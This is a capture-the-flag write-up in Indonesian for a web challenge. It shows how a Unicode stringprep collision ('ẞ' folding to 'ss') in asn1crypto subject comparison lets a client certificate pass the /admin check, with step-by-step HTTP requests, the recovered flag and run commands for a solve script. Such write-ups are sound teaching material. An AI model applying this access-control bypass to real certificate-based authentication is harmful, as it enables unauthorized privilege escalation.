# ASS

## Ringkasan

Bug ada di perbedaan cara aplikasi menangani nama sertifikat.

- Endpoint `/certificates` mencegah duplikasi nama dengan `issued_names`, jadi yang dicek string mentah.
- Endpoint `/admin` tidak cek profile sertifikat. Ia cuma cek subject sertifikat yang dipresentasi sama dengan subject sertifikat admin pertama.
- `ca.subject()` memakai `asn1crypto.x509.Name`, dan equality di sana melakukan stringprep. Karakter `ẞ` di-fold jadi `ss`, sehingga beberapa nama beda dianggap subject yang sama.

Pasangan yang dipakai:

- Admin: `SSSẞ`
- Client: `SSẞS`

Kedua string itu beda untuk `issued_names`, tapi subject hasil normalisasinya sama, jadi sertifikat `CLIENT` bisa lolos sebagai admin.

## Target dan File

- Remote: `https://ass-deba4b05b3b5.chall.nnsc.tf`
- Source utama: [app.py](/home/nata/ctf/NNSCTF/web/Ass/web_ass/app.py:1)
- Helper CA: [ca.py](/home/nata/ctf/NNSCTF/web/Ass/web_ass/ca.py:1)
- Validator nama: [names.py](/home/nata/ctf/NNSCTF/web/Ass/web_ass/names.py:1)
- Solve script: [solve.py](/home/nata/ctf/NNSCTF/web/Ass/web_ass/solve.py:1)

## Analisis Awal

Route penting cuma sedikit:

- `POST /certificates` untuk minta sertifikat `ADMIN` atau `CLIENT`
- `GET /auth/nonce` untuk challenge yang harus ditandatangani
- `POST /admin` untuk ambil flag

`/admin` awalnya balas `409 no administrator certificate has been provisioned`, berarti kita memang harus memprovision admin dulu.

## Source Code Review

Di [app.py](/home/nata/ctf/NNSCTF/web/Ass/web_ass/app.py:69), aplikasi menolak nama duplikat dengan:

```python
if request.name in issued_names:
    raise HTTPException(status_code=409, detail="name already in use")
```

Masalahnya, otorisasi admin di [app.py](/home/nata/ctf/NNSCTF/web/Ass/web_ass/app.py:174) pakai:

```python
authorized = ca.subject(presented) == ca.subject(administrator_certificate)
```

`ca.subject()` di [ca.py](/home/nata/ctf/NNSCTF/web/Ass/web_ass/ca.py:24) mengubah sertifikat ke objek `asn1crypto.x509.Name`. Equality objek itu tidak membandingkan bytes mentah, tapi hasil stringprep.

Validator nama di [names.py](/home/nata/ctf/NNSCTF/web/Ass/web_ass/names.py:5) justru mengizinkan `LATIN CAPITAL LETTER SHARP S` (`ẞ`), yang jadi sumber collision.

## Vulnerability

Jenis bug-nya broken access control karena canonicalization mismatch.

Alurnya:

1. Minta sertifikat `ADMIN` dengan nama `SSSẞ`.
2. Minta sertifikat `CLIENT` dengan nama `SSẞS`.
3. Ambil nonce dari `/auth/nonce`.
4. Tanda tangani nonce pakai private key milik sertifikat `CLIENT`.
5. Kirim sertifikat `CLIENT` ke `/admin`.

Private key verify tetap lolos karena signature memang dibuat oleh pemilik sertifikat `CLIENT`.
Check admin juga lolos karena subject `SSSẞ` dan `SSẞS` dianggap sama oleh `asn1crypto`.

## Eksploitasi

Request penting untuk bukti:

```http
POST /certificates
Content-Type: application/json

{"profile":"ADMIN","name":"SSSẞ"}
```

```http
POST /certificates
Content-Type: application/json

{"profile":"CLIENT","name":"SSẞS"}
```

Lalu `nonce` ditandatangani memakai private key dari respons kedua, dan hasilnya dikirim ke:

```http
POST /admin
Content-Type: application/json

{
  "certificate": "<PEM sertifikat CLIENT>",
  "nonce": "<nonce>",
  "signature": "<base64 ed25519 signature>"
}
```

Respons valid yang saya dapat dari target remote:

```json
{"flag":"NNS{rfc_3454_froZe_7he_74B13_bUt_tH3_UN1coD3_kep7_w41K1Ng_CR4ZY_right}"}
```

## Solve Script

`solve.py` mengotomasi seluruh chain:

- provision admin collision seed
- provision client collision pair
- ambil nonce
- sign nonce
- kirim request ke `/admin`
- ekstrak flag dari response

## Cara Menjalankan

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py
```

Atau:

```bash
TARGET="https://ass-deba4b05b3b5.chall.nnsc.tf" python3 solve.py
```

## Flag

`NNS{rfc_3454_froZe_7he_74B13_bUt_tH3_UN1coD3_kep7_w41K1Ng_CR4ZY_right}`

## Catatan Stabilitas

- Eksploit butuh target yang belum punya sertifikat admin. Saat diuji, `/admin` masih balas `409 no administrator certificate has been provisioned`.
- Jika instance sudah dipakai orang lain dan admin certificate sudah terlanjur dibuat dengan nama lain, solve script akan gagal di langkah provision admin.
- Pair collision yang dipakai berasal dari normalisasi `ẞ -> ss` pada stringprep X.509 di `asn1crypto`.
